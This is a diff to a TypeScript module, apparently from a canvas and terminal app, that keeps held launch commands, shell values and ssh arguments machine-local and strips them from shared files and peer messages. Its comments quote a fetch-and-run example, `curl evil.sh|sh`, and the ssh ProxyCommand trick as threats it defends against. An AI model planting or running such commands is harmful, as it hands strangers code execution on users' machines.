@@ -12,6 +12,13 @@
  *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
  *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
  *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
+ *  - `CanvasNodeState.pendingLaunch` — a held launch. Its `command` is TYPED into the node's shell
+ *    once the canvas says the wait is over (`launchesToFire`), and `after: []` or a dep that no
+ *    longer exists counts as satisfied. So a project file or a wire frame carrying one is a command
+ *    that runs as soon as the canvas is viewed. It is produced only by this machine's own
+ *    orchestration (`--after`, a cold open, a worktree setup gate), so it is machine-local exactly
+ *    like `shell`: never written to a shared file, never accepted from a peer, and round-tripped
+ *    through the machine-local index so an armed node still fires after an app restart.
  *
  * Both are legitimate when the LOCAL user sets them, so they are not deleted — they are made
  * MACHINE-LOCAL: `stripSharedNodeExec` keeps them out of every project file we write, and
@@ -26,8 +33,9 @@
  * a program string carrying shell metacharacters is never handed to tmux.
  */
 
+import { normalizePendingLaunch } from './pending-launch-shape'
 import { sshExtraArgsEnableLocalExec } from './ssh'
-import type { CanvasNodeState } from './types'
+import type { CanvasMutation, CanvasNodeState, PendingLaunch } from './types'
 
 /** Per-node exec values the LOCAL machine typed. Persisted only in the machine-local index. */
 export interface LocalNodeExec {
@@ -35,6 +43,8 @@ export interface LocalNodeExec {
   shell?: string
   /** `NodeState.ssh.extraArgs` — raw advanced ssh args for this node's connection. */
   sshExtraArgs?: string
+  /** `CanvasNodeState.pendingLaunch` — a launch THIS machine armed and has not delivered yet. */
+  pendingLaunch?: PendingLaunch
 }
 
 /** Node id → the exec values that stay on this machine. */
@@ -67,11 +77,18 @@ export function safeSessionProgram(shell: string | undefined): string | undefine
  * The values survive on this machine via `localNodeExec` (below); what leaves for git/the remote
  * host carries no command of any kind.
  */
-function stripNodeExec(n: CanvasNodeState): CanvasNodeState {
-  if (n.shell === undefined && n.ssh?.extraArgs === undefined && n.ssh?.execTrusted === undefined)
+function stripNodeExec(n: CanvasNodeState, keepLaunch = false): CanvasNodeState {
+  const launch = !keepLaunch && n.pendingLaunch !== undefined
+  if (
+    n.shell === undefined &&
+    n.ssh?.extraArgs === undefined &&
+    n.ssh?.execTrusted === undefined &&
+    !launch
+  )
     return n
   const out: CanvasNodeState = { ...n }
   delete out.shell
+  if (launch) delete out.pendingLaunch
   if (out.ssh) {
     // `execTrusted` goes with the value it vouches for. It is a MACHINE-LOCAL provenance marker:
     // if it could ride a document or a wire frame, a hostile one would simply set it to true.
@@ -82,7 +99,21 @@ function stripNodeExec(n: CanvasNodeState): CanvasNodeState {
 }
 
 export function stripSharedNodeExec(nodes: CanvasNodeState[]): CanvasNodeState[] {
-  return nodes.map(stripNodeExec)
+  return nodes.map((n) => stripNodeExec(n))
+}
+
+/**
+ * What a renderer may CAST on `canvas:mut`: the shared strip, except that a held launch rides along.
+ *
+ * The cast goes to this machine's own core, not to a teammate: the reflector (core/canvas-sync.ts)
+ * decides per RECIPIENT whether a `pendingLaunch` may travel on. It passes one on only from an OWNER
+ * client (this machine's app window, or a Server Edition browser tab the session cookie
+ * authenticated) to another owner client, marked `origin: 'core'`, and strips it for everybody else.
+ * Owner→owner sync is what keeps two Server Edition tabs from both typing the same launch: the tab
+ * that claims it (`attempted: true`) must reach the other before that one's loop runs.
+ */
+export function stripCastNodeExec(nodes: CanvasNodeState[]): CanvasNodeState[] {
+  return nodes.map((n) => stripNodeExec(n, true))
 }
 
 /**
@@ -100,8 +131,26 @@ export function stripSharedNodeExec(nodes: CanvasNodeState[]): CanvasNodeState[]
  * program to run here, which ssh options to pass here), and neither is meaningful on a canvas that
  * is merely being mirrored. So they are dropped at ingest, on every surface.
  */
-export function sanitizeInboundNode(node: CanvasNodeState): CanvasNodeState {
-  return stripNodeExec(node)
+export function sanitizeInboundNode(node: CanvasNodeState, trustLaunch = false): CanvasNodeState {
+  return stripNodeExec(node, trustLaunch)
+}
+
+/**
+ * Whether an inbound mutation's `pendingLaunch` may be taken as-is. Only the core sets
+ * `origin: 'core'` (the reflector deletes a client-supplied one, and adds it only for a mutation that
+ * came from an OWNER client or from the core itself, sent to an owner client). Absent = the node's
+ * held launch is not the sender's to set: ours is carried, theirs is dropped.
+ */
+export function mutationTrustsLaunch(m: { origin?: unknown }): boolean {
+  return m.origin === 'core'
+}
+
+/** A copy of `m` without a core `origin` — for a receiver that must not trust its transport (a relay
+ *  tab: the mutation came from ANOTHER machine's core, which can put anything on the wire). */
+export function withoutCoreOrigin<T extends { origin?: unknown }>(m: T): T {
+  if (m.origin === undefined) return m
+  const { origin: _origin, ...rest } = m
+  return rest as T
 }
 
 /**
@@ -115,23 +164,31 @@ export function sanitizeInboundNode(node: CanvasNodeState): CanvasNodeState {
  */
 export function carryLocalNodeExec(
   prev: CanvasNodeState | undefined,
-  next: CanvasNodeState
+  next: CanvasNodeState,
+  trustLaunch = false
 ): CanvasNodeState {
   if (!prev) return next
   const extraArgs = prev.ssh?.extraArgs
-  if (prev.shell === undefined && extraArgs === undefined) return next
+  // A trusted (owner/core) mutation is authoritative for the held launch, INCLUDING its absence:
+  // that is how a delivered launch is cleared on every owner client.
+  const launch = trustLaunch ? undefined : prev.pendingLaunch
+  if (prev.shell === undefined && extraArgs === undefined && launch === undefined) return next
   const out: CanvasNodeState = { ...next }
   if (prev.shell !== undefined) out.shell = prev.shell
+  if (launch !== undefined) out.pendingLaunch = launch
   if (extraArgs !== undefined && out.ssh)
     out.ssh = { ...out.ssh, extraArgs, execTrusted: prev.ssh?.execTrusted }
   return out
 }
 
-/** `sanitizeInboundNode` for a whole mutation (the stamps — `src`, `seq` — are preserved). */
-export function sanitizeInboundMutation<T extends { op: 'upsert' | 'remove' }>(m: T): T {
+/** `sanitizeInboundNode` for a whole mutation (the stamps — `src`, `seq`, `seen` — are preserved).
+ *  Only `upsert` carries a node; every other op (`remove`, the edge ops and the board ops, which
+ *  carry no node) passes through untouched. `keepLaunch` is for the reflector alone, and only for an
+ *  OWNER sender (see `stripCastNodeExec`). */
+export function sanitizeInboundMutation<T extends CanvasMutation>(m: T, keepLaunch = false): T {
   if (m.op !== 'upsert') return m
   const up = m as unknown as { node: CanvasNodeState }
-  const node = sanitizeInboundNode(up.node)
+  const node = sanitizeInboundNode(up.node, keepLaunch)
   return node === up.node ? m : ({ ...m, node } as T)
 }
 
@@ -156,7 +213,11 @@ export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | unde
     const extraArgs = n.ssh?.extraArgs
     if (extraArgs && (n.ssh?.execTrusted || !sshExtraArgsEnableLocalExec(extraArgs)))
       entry.sshExtraArgs = extraArgs
-    if (entry.shell || entry.sshExtraArgs) map[n.id] = entry
+    // A held launch in the live nodes was armed here: every inbound path drops a foreign one
+    // (`sanitizeInboundNode`, `applyLocalNodeExec`), so what reaches this collector is ours.
+    const pending = normalizePendingLaunch(n.pendingLaunch)
+    if (pending) entry.pendingLaunch = pending
+    if (entry.shell || entry.sshExtraArgs || entry.pendingLaunch) map[n.id] = entry
   }
   return Object.keys(map).length ? map : undefined
 }
@@ -179,6 +240,13 @@ export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | unde
  *
  * `shell` is still validated: it has no producer, so anything there is either junk or an attack,
  * and blessing a value the exec site would refuse anyway buys nothing.
+ *
+ * `pendingLaunch` is deliberately NEVER hoisted. Its provenance cannot be told apart: a file written
+ * by an older build of THIS machine and one a hostile repo committed look identical, and the
+ * `execMigrated` flag was already set on every existing entry before `pendingLaunch` joined the
+ * boundary, so "already referenced" proves nothing about it. Failing closed costs a user who
+ * upgrades with armed nodes their held launch (the node shows no QUEUED badge; re-issue it or type
+ * the command); failing open runs a stranger's command.
  */
 export function hoistLegacyNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | undefined {
   const map: LocalNodeExecMap = {}
@@ -204,8 +272,13 @@ export function applyLocalNodeExec(
 ): CanvasNodeState[] {
   return nodes.map((n) => {
     const mine = local?.[n.id]
-    const out: CanvasNodeState = stripNodeExec(n)
+    // A fresh object: `stripNodeExec` returns its INPUT untouched when there is nothing to strip, and
+    // the writes below must never reach back into the caller's (parsed file's) node.
+    const out: CanvasNodeState = { ...stripNodeExec(n) }
     if (mine?.shell) out.shell = mine.shell
+    // workspace.json is hand-editable too: re-validate the shape, as the renderer's serializers do.
+    const pending = normalizePendingLaunch(mine?.pendingLaunch)
+    if (pending) out.pendingLaunch = pending
     if (out.ssh && mine?.sshExtraArgs) {
       // Ours: it came out of the machine-local index, so the exec site may honor an option like
       // ProxyCommand (a jump host is a legitimate thing to have configured).
